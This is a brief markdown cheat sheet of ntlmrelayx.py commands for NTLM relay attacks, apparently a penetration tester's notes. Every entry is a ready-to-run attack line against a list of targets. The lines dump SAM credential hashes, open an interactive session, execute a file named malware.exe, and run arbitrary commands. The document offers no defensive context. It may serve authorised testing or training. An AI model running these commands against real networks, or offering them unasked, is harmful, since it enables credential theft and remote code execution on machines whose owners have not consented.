# ntlmrelayx

## dump SAM

`ntlmrelayx.py -tf targets.txt -smb2support`

## interactive session

`ntlmrelayx.py -tf targets.txt -smb2support -i`

## Execute a file

`ntlmrelayx.py -tf targets.txt -smb2support -e malware.exe`

## Execute a command

`ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
